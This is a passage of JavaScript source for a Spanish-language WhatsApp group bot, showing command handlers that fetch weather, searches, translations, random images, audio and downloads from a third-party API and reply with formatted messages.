💉 Total de pruebas: ${TeslApi.pruebas}
🔬 Pruebas por millon: ${TeslApi.pruebasPorMillon}`,
					"footerText": `🦠 ${NameBot}`,
					"buttons": [{
						"buttonId": `<${sender}/>`,
						"buttonText": {
							"displayText": `COVID-MUNDO 🌎${nwn}\n~> ${TeslApi.datos}`
						},
						"type": "RESPONSE"
					}],
					"headerType": 6,
					"locationMessage": loc,
					quoted: null
				}, MessageType.buttonsMessage, {
					contextInfo: {
						mentionedJid: [sender]
					}
				})
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'clima': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isDiversion) return reply(`*[ ! ] El modo full esta desactivado*`)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!UwU) return reply('*[ ! ] Introduzca el nombre de la ciudad*')
				buscando(`_Buscando resultado, ${pushname} por favor espere..._`)
				try {
					var TeslApix = await fetchJson(`https://latam-api.vercel.app/api/clima?apikey=${MyApiKey}&q=${UwU}`)
				} catch (e) {
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					console.log(`Error fetch, comando: ${command}`)
				}
				teslagod.sendMessage(from, {
					degreesLatitude: TeslApix.latitud,
					degreesLongitude: TeslApix.longitud
				}, location, {
					quoted: null
				})
				reply(`${monospace}[ CLIMA ]${monospace}

📆 Fecha: ${time}
🌁 Ciudad: ${TeslApix.lugar}
🗺️ Zona horaria: ${TeslApix.zonaHoraria}
📄 Descripcion: ${TeslApix.clima.descripcion}
🌡️Temperatura: Minimo ${TeslApix.clima.temperatura.minimo}ºC / Maximo ${TeslApix.clima.temperatura.maximo}ºC
🎭 Sensacion: ${TeslApix.clima.temperatura.sensacion}
🏞️ Presion atmosferica: ${TeslApix.clima.temperatura.presion}milibares
💦 Humedad: ${TeslApix.clima.temperatura.humedad}%
👁️ Visibilidad: ${TeslApix.clima.visibilidad}msnm
🌪️ Viento: Velocidad ${TeslApix.clima.viento.velocidad}km/h
☁️ Nubes: ${TeslApix.clima.principal}%`)
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'github': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isDiversion) return reply(`*[ ! ] El modo full esta desactivado*`)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				buscando(`_Buscando resultado, ${pushname} por favor espere..._`)
				try {
					var TeslApix = await fetchJson(`https://latam-api.vercel.app/api/github?apikey=${MyApiKey}&q=${UwU ? UwU : "NeKosmic"}`)
				} catch (e) {
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					console.log(`Error fetch, comando: ${command}`)
				}
				var usuario = TeslApix.nick
				var githumb = await getBuffer(TeslApix.imagen)
				loc = {
					"degreesLatitude": 0,
					"degreesLongitude": 0,
					"jpegThumbnail": githumb
				}
				if (usuario.includes("NeKosmic")) {
					teslagod.sendMessage(from, {
						"contentText": `${monospace}[ USUARIO-GITHUB-🐱 ]${monospace}

🧿 ID: ${TeslApix.id}
⚡ Usuario: ${TeslApix.nick}
🔥 Nombre: ${TeslApix.nombre}
🫂 Seguidores: ${TeslApix.seguidores}
🤝 Siguiendo: ${TeslApix.siguiendo}
🧰 Repositorios: ${TeslApix.repositorios}
🏗️ Compañía: ${TeslApix.empresa}
🧑‍💻 Blog: ${TeslApix.blog}
🌎 Ubicación: ${TeslApix.ubicacion}
📈 Fecha de creacion: ${TeslApix.fechaDeCreacion}
📉 Ultima actualizacion: ${TeslApix.ultimaActualizacion}
📜 Biografia: ${TeslApix.biografia}`,
						"footerText": `GITHUB [_>]\n${NameBot}`,
						"buttons": [{
							"buttonId": `<${sender}/>`,
							"buttonText": {
								"displayText": `</ ${TeslApix.nick} > ${nwn}\n~> ${TeslApix.link}`
							},
							"type": "RESPONSE"
						}],
						"headerType": 6,
						"locationMessage": loc,
						quoted: null
					}, MessageType.buttonsMessage, {
						contextInfo: {
							mentionedJid: [sender]
						}
					})
					await teslagod.sendMessage(from, fs.readFileSync('./multimedia/sonidos/audiouwu/OP.m4a'), audio, {
						mimetype: 'audio/mp4',
						ptt: true,
						quoted: fakemek
					})
				} else {
					return await teslagod.sendMessage(from, {
						"contentText": `${monospace}[ USUARIO-GITHUB-🐱 ]${monospace}

🧿 ID: ${TeslApix.id}
⚡ Usuario: ${TeslApix.nick}
🔥 Nombre: ${TeslApix.nombre}
🫂 Seguidores: ${TeslApix.seguidores}
🤝 Siguiendo: ${TeslApix.siguiendo}
🧰 Repositorios: ${TeslApix.repositorios}
🏗️ Compañía: ${TeslApix.empresa}
🧑‍💻 Blog: ${TeslApix.blog}
🌎 Ubicación: ${TeslApix.ubicacion}
📈 Fecha de creacion: ${TeslApix.fechaDeCreacion}
📉 Ultima actualizacion: ${TeslApix.ultimaActualizacion}
📜 Biografia: ${TeslApix.biografia}`,
						"footerText": `GITHUB [_>]\n${NameBot}`,
						"buttons": [{
							"buttonId": `<${sender}/>`,
							"buttonText": {
								"displayText": `</ ${TeslApix.nick} > ${nwn}\n~> ${TeslApix.link}`
							},
							"type": "RESPONSE"
						}],
						"headerType": 6,
						"locationMessage": loc,
						quoted: null
					}, MessageType.buttonsMessage, {
						contextInfo: {
							mentionedJid: [sender]
						}
					})
				}
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'notificacion':
			case 'notificación': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isDiversion) return reply(`*[ ! ] El modo full esta desactivado*`)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				try {
					var TeslApi = await fetchJson(`https://latam-api.vercel.app/api/noti_rand?apikey=${MyApiKey}`)
				} catch (e) {
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					console.log(`Error fetch, comando: ${command}`)
				}
				reply(TeslApi.notificacion)
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'tumama': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isDiversion) return reply(`*[ ! ] El modo full esta desactivado*`)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				try {
					var TeslApi = await fetchJson(`https://latam-api.vercel.app/api/tumama?apikey=${MyApiKey}`)
				} catch (e) {
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					console.log(`Error fetch, comando: ${command}`)
				}
				reply(TeslApi.respuesta)
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'comediante': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isDiversion) return reply(`*[ ! ] El modo full esta desactivado*`)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				try {
					var rees = await fetchJson(`https://latam-api.vercel.app/api/comedia?apikey=${MyApiKey}`)
				} catch (e) {
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					console.log(`Error fetch, comando: ${command}`)
				}
				teslagod.sendMessage(from, rees.risa_not_1, MessageType.text, {
					sendEphemeral: true,
					quoted: {
						key: {
							participant: `0@s.whatsapp.net`,
							...(from ? {
								remoteJid: "51995386439-1613049930@g.us"
							} : {})
						},
						message: {
							"videoMessage": {
								"title": `Sinsentido :v`,
								"h": `UwU`,
								'seconds': '359996400',
								'gifPlayback': 'true',
								'caption': `Sinsentido :v`,
								'jpegThumbnail': fs.readFileSync('./multimedia/imagenes/ComediaHD.jpg')
							}
						}
					}
				})
				reply(rees.risa_not_2 ? rees.risa_not_2 : "Mucha comedia 🤡")
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'consejo': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isDiversion) return reply(`*[ ! ] El modo full esta desactivado*`)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				try {
					var rpt = await fetchJson(`https://latam-api.vercel.app/api/rand_aviso?apikey=${MyApiKey}`)
				} catch (e) {
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					console.log(`Error fetch, comando: ${command}`)
				}
				reply(rpt.aviso)
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'traductor':
			case 'tr':
			case 'traducir': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isDiversion) return reply(`*[ ! ] El modo full esta desactivado*`)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				try {
					textojid = mek.quoted.text
				} catch (e) {
					textojid = UwU
				}
				let itr = await fetchJson(`https://latam-api.vercel.app/api/traductor?apikey=${MyApiKey}&idioma1=es&texto1=${textojid ? textojid  : "No se pudo traducir"}`)
				reply(itr.traducido)
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'pinterest': { //buscador de imagenes en pinterest uwu
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isDiversion) return reply(`*[ ! ] El modo full esta desactivado*`)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!UwU) return reply(`*[ ! ] Que desea buscar de pinterest?*`)
				buscando(`_Buscando resultado, ${pushname} por favor espere..._`)
				try {
					var pin = await fetchJson(`https://latam-api.vercel.app/api/pinterest?apikey=${MyApiKey}&q=${UwU}`)
				} catch (e) {
					reply(`[ ! ] Ocurrió un error inesperado u.u`)
					console.log(`Error fetch, comando: ${command}`)
				}
				let resulttt = await getBuffer(pin.imagen)
				miniaturaNK(resulttt, `*[ PINTEREST-CHAN ] ✓*\n*~> Resultado para* : _${UwU}_`)
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'imagen': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isDiversion) return reply(`*[ ! ] El modo full esta desactivado*`)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!UwU) return reply(`*[ ! ] Que desea buscar en Google_imagenes?*`)
				buscando(`_Buscando resultado, ${pushname} por favor espere..._`)
				try {
					var TeslApi = await fetchJson(`https://latam-api.vercel.app/api/g_img?apikey=${MyApiKey}&q=anime`)
				} catch (e) {
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					console.log(`Error fetch, comando: ${command}`)
				}
				miniaturaNK({
					url: TeslApi.imagen
				}, `*[ GOOGLE-CHAN ] ✓*\n*~> Resultado para* : _${UwU}_\n*~> Tamaño* : _${TeslApi.ancho} x ${TeslApi.altura} PX_`)
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'google': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isDiversion) return reply(`*[ ! ] El modo full esta desactivado*`)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!UwU) return reply(`*[ ! ] Que desea buscar de Google?*`)
				buscando(`_Buscando resultado, ${pushname} por favor espere..._`)
				let search = await google({
					query: UwU
				})
				let ggsm = ``
				for (let i of search) {
					ggsm += `\n*Titulo :* ${i.title}\n*Link :* ${i.link}\n*Contenido :* ${i.snippet}\n\n`
				}
				var browser = ggsm.trim()
				miniaturaNK(fs.readFileSync('./multimedia/imagenes/GugulHD.jpg'), `〘  *GOOGLE* 〙\n_~> Resultados para : ${UwU}_\n${nwn}\n${browser}`)
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'wikipedia': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isDiversion) return reply(`*[ ! ] El modo full esta desactivado*`)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!UwU) return reply(`*[ ! ] Que desea buscar de wikipedia?*`)
				buscando(`_Buscando resultado, ${pushname} por favor espere..._`)
				try {
					var res = await fetchJson(`https://latam-api.vercel.app/api/wikipedia?apikey=${MyApiKey}&q=${UwU}`)
				} catch (e) {
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					console.log(`Error fetch, comando: ${command}`)
				}
				miniaturaNK({
					url: res.datos.miniatura
				}, `|| *WIKIPEDIA* ||\n_~> Resultados para : ${UwU}_\n${nwn}\n${res.datos.wikinfo}`)
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'playstore': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isDiversion) return reply(`*[ ! ] El modo full esta desactivado*`)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!UwU) return reply(`*[ ! ] Que desea buscar de playstore?*`)
				buscando(`_Buscando resultado, ${pushname} por favor espere..._`)
				try {
					var TeslApi = await fetchJson(`https://latam-api.vercel.app/api/playstore?apikey=${MyApiKey}&q=${UwU}`)
				} catch (e) {
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					console.log(`Error fetch, comando: ${command}`)
				}
				loc = {
					"degreesLatitude": 0,
					"degreesLongitude": 0,
					"jpegThumbnail": fs.readFileSync('./multimedia/imagenes/GplayHD.jpg')
				}
				await teslagod.sendMessage(from, {
					"contentText": `${TeslApi.resultados}`,
					"footerText": `🎮 ${NameBot}`,
					"buttons": [{
						"buttonId": `<${sender}/>`,
						"buttonText": {
							"displayText": `${UwU}`
						},
						"type": "RESPONSE"
					}],
					"headerType": 6,
					"locationMessage": loc,
					quoted: null
				}, MessageType.buttonsMessage, {
					contextInfo: {
						mentionedJid: [sender]
					}
				})
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'randimg': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isDiversion) return reply(`*[ ! ] El modo full esta desactivado*`)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				try {
					var TeslApi = await fetchJson(`https://latam-api.vercel.app/api/rand_img?apikey=${MyApiKey}`)
				} catch (e) {
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					console.log(`Error fetch, comando: ${command}`)
				}
				let resimg = await getBuffer(TeslApi.randimg)
				let nextbut = [{
					buttonId: `${prefix + command}`,
					buttonText: {
						displayText: '< [ OTRO ] >',
					},
					type: 1,
				}, ]
				let mhan = await teslagod.prepareMessage(from, resimg, image)
				const buttonMessages = {
					imageMessage: mhan.message.imageMessage,
					contentText: `💾`,
					footerText: `ᴺᴼᵀᴬ⁼ ᴱˢᵗᵃ́ ᶦᵐᵃ́ᵍᵉⁿ ⁿᵒ ᵖᵘᵉᵈᵉ ᶜᵒⁿᵛᵉʳᵗᶦʳˢᵉ ᵃ ˢᵗᶦᶜᵏᵉʳ`,
					buttons: nextbut,
					headerType: 4
				}
				teslagod.sendMessage(from, buttonMessages, MessageType.buttonsMessage, {
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: `${pushname} Quieres cooperar con una imagen?`,
							body: 'Click aqui :v',
							sourceUrl: `https://api.whatsapp.com/send?phone=51995386439&text=Deseo%20aportar%20una%20imagen%20aleatoria%20al%20bot%0AAportante%3A%20${pushname}%0ALink%3A%20`,
							thumbnail: userthumb
						}
					}
				}).catch(e => {
					teslagod.sendMessage(from, resimg, image, {
						quoted: fakemek,
						caption: "💾",
						contextInfo: {
							externalAdReply: {
								title: `${pushname} Quieres cooperar con una imagen?`,
								body: 'Click aqui :v',
								sourceUrl: `https://api.whatsapp.com/send?phone=51995386439&text=Deseo%20aportar%20una%20imagen%20aleatoria%20al%20bot%0AAportante%3A%20${pushname}%0ALink%3A%20`,
								thumbnail: userthumb
							}
						}
					})
				})
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'djbot': { //audio random
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isDiversion) return reply(`*[ ! ] El modo full esta desactivado*`)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				procesando(`_Procesando, ${pushname} por favor espere..._`)
				try {
					var TeslApi = await fetchJson(`https://latam-api.vercel.app/api/rand_audio?apikey=${MyApiKey}`)
				} catch (e) {
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					console.log(`Error fetch, comando: ${command}`)
				}
				let nkptt = await getBuffer(TeslApi.audio)
				teslagod.updatePresence(from, Presence.recording)
				await teslagod.sendMessage(from, nkptt, audio, {
					mimetype: 'audio/mp4',
					ptt: true,
					filename: `${nkptt}.mp3`,
					quoted: fvn,
					contextInfo: {
						"externalAdReply": {
							"title": `🤖 ${NameBot} 🎧`,
							mediaType: 2,
							"thumbnail": fs.readFileSync('./multimedia/imagenes/DjbotHD.jpg'),
							"previewType": "VIDEO",
							"mediaUrl": `https://youtu.be/ed-6VSF-GGc`
						}
					}
				})
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'letra': { //letra de una canción :3
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isDiversion) return reply(`*[ ! ] El modo full esta desactivado*`)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!UwU) return reply(`*[ ! ] Y el texto?*`)
				buscando(`_Buscando resultado, ${pushname} por favor espere..._`)
				try {
					var TeslApi = await fetchJson(`https://latam-api.vercel.app/api/musixmatch?apikey=${MyApiKey}&q=${UwU}`)
				} catch (e) {
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					console.log(`Error fetch, comando: ${command}`)
				}
				let resimg = await getBuffer(TeslApi.imagen)
				teslagod.sendMessage(from, resimg, image, {
					quoted: fakemek,
					caption: TeslApi.letra
				})
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'xd': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isDiversion) return reply(`*[ ! ] El modo full esta desactivado*`)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				procesando(`_Procesando, ${pushname} por favor espere..._`)
				try {
					var TeslApi = await fetchJson(`https://latam-api.vercel.app/api/xd_img?apikey=${MyApiKey}`)
				} catch (e) {
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					console.log(`Error fetch, comando: ${command}`)
				}
				let xdimg = await getBuffer(TeslApi.imagen)
				miniaturaNK(xdimg, `ª`)
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'perros':
			case 'perro':
			case 'wof':
			case 'dog': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isDiversion) return reply(`*[ ! ] El modo full esta desactivado*`)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				procesando(`_Procesando, ${pushname} por favor espere..._`)
				try {
					var TeslApi = await fetchJson(`https://latam-api.vercel.app/api/dogis?apikey=${MyApiKey}`)
				} catch (e) {
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					console.log(`Error fetch, comando: ${command}`)
				}
				let imgrpt = await getBuffer(TeslApi.imagen)
				enviarIMG(imgrpt, mythumb, `┏━━⊱ Imagen : ${command}\n┣━⊱ Solicitada por : ${senderNumber}\n┗⊱ Fecha : ${fechaCompleta}`)
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'gatos':
			case 'gato':
			case 'meow':
			case 'cat': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isDiversion) return reply(`*[ ! ] El modo full esta desactivado*`)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				procesando(`_Procesando, ${pushname} por favor espere..._`)
				try {
					var TeslApi = await fetchJson(`https://latam-api.vercel.app/api/michis?apikey=${MyApiKey}`)
				} catch (e) {
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					console.log(`Error fetch, comando: ${command}`)
				}
				let imgrpt = await getBuffer(TeslApi.imagen)
				enviarIMG(imgrpt, mythumb, `┏━━⊱ Imagen : ${command}\n┣━⊱ Solicitada por : ${senderNumber}\n┗⊱ Fecha : ${fechaCompleta}`)
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'pato':
			case 'patos':
			case 'ganzo':
			case 'ganso': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isDiversion) return reply(`*[ ! ] El modo full esta desactivado*`)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				procesando(`_Procesando, ${pushname} por favor espere..._`)
				try {
					var TeslApi = await fetchJson(`https://latam-api.vercel.app/api/kuack?apikey=${MyApiKey}`)
				} catch (e) {
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					console.log(`Error fetch, comando: ${command}`)
				}
				let imgrpt = await getBuffer(TeslApi.imagen)
				enviarIMG(imgrpt, mythumb, `┏━━⊱ Imagen : ${command}\n┣━⊱ Solicitada por : ${senderNumber}\n┗⊱ Fecha : ${fechaCompleta}`)
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'wallpaper':
			case 'wpp':
			case 'fondo': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isDiversion) return reply(`*[ ! ] El modo full esta desactivado*`)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				procesando(`_Procesando, ${pushname} por favor espere..._`)
				try {
					var result = await fetchJson(`https://latam-api.vercel.app/api/wpp?apikey=${MyApiKey}&q=${UwU}`)
				} catch (e) {
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					console.log(`Error fetch, comando: ${command}`)
				}
				let imgrpt = await getBuffer(result.imagen)
				enviarIMG(imgrpt, mythumb, `┏━━━⊱ Imagen : ${command}\n┣━━⊱ Solicitada por : ${senderNumber}\n┣━⊱ Tipo: ${result.tipo}\n┗⊱ Fecha : ${fechaCompleta}`)
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'mediafire': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isDiversion) return reply(`*[ ! ] El modo full esta desactivado*`)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!UwU) return reply('*[ ! ] Y el Link?*')
				if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) return reply('*[ ! ] Link invalido*\n_Por favor, use un link de MediaFire_')
				procesando(`_Procesando, ${pushname} por favor espere..._`)
				try {
					var resm = await fetchJson(`https://latam-api.vercel.app/api/mediafiredl?apikey=${MyApiKey}&q=${UwU}`)
				} catch (e) {
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					console.log(`Error fetch, comando: ${command}`)
				}
				let medilink = await getBuffer(resm.descarga)
				await teslagod.sendMessage(from, medilink, MessageType.document, {
					quoted: fakemek,
					mimetype: resm.extension,
					filename: `${resm.nombre}`,
					thumbnail: mythumb,
					sendEphemeral: true
				})
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'play': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isDiversion) return reply(`*[ ! ] El modo full esta desactivado*`)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!UwU) return reply(`*[ ! ] Que desea buscar?*`)
				procesando(`_Procesando, ${pushname} por favor espere..._`)
				let playtext = encodeURIComponent(UwU)
				try {
					var myapidl = await fetchJson(`https://latam-api.vercel.app/api/ytplay?apikey=${MyApiKey}&q=${playtext}`)
					/*var myapidl = await fetchJson(`https://latam-api.vercel.app/api/ytplay2?apikey=${MyApiKey}&q=${playtext}`)*/
				} catch (e) {
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					console.log(`Error fetch, comando: ${command}`)
				}
				let ytthumb = await getBuffer(myapidl.logo)
				let audapi = await getBuffer(myapidl.descarga)
				await teslagod.sendMessage(from, `${monospace}Enviando audio, espere...${monospace}`, MessageType.text, {
					sendEphemeral: true,
					quoted: fakemek,
					contextInfo: {
						"externalAdReply": {
							"title": `${myapidl.titulo}`,
							"body": `1:23 ━━━━●───────── ${myapidl.duracion}`,
							"previewType": "PHOTO",
							"thumbnailUrl": ``,
							"thumbnail": ytthumb,
							"sourceUrl": myapidl.descarga
						}
					}
				})
				teslagod.sendMessage(from, audapi, audio, {
					mimetype: 'audio/mp4',
					filename: `${myapidl.titulo}.mp3`,
					quoted: fakemek
				})
				//
				addFilter(from)
				//await limitAdd(sender)
				addLevelingXp(sender, 450)
				addLevelingLevel(sender, 1)
			}
			break
			case 'play2': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isDiversion) return reply(`*[ ! ] El modo full esta desactivado*`)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!UwU) return reply(`*[ ! ] Que desea buscar?*`)
				buscando(`_Buscando resultado, ${pushname} por favor espere..._`)
				let playtext = encodeURIComponent(UwU)
				try {
					var busqueda = await fetchJson(`https://latam-api.vercel.app/api/yts?apikey=${MyApiKey}&q=${playtext}`)
				} catch (e) {
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					console.log(`Error fetch, comando: ${command}`)
				}
				let ranum = pickRandom(['0', '1', '2'])
				let datayt = busqueda.resultados[ranum]
				let ytthumb = await getBuffer(datayt.imagen)
				let loc = {
					"degreesLatitude": 0,
					"degreesLongitude": 0,
					"jpegThumbnail": ytthumb
				}
				await teslagod.sendMessage(from, {
					"contentText": `✍️ Titulo : ${datayt.titulo}
⚡ Autor : ${datayt.autor}
⏰ Duracion : ${datayt.duracion}
👀 Vistas : ${datayt.vistas}
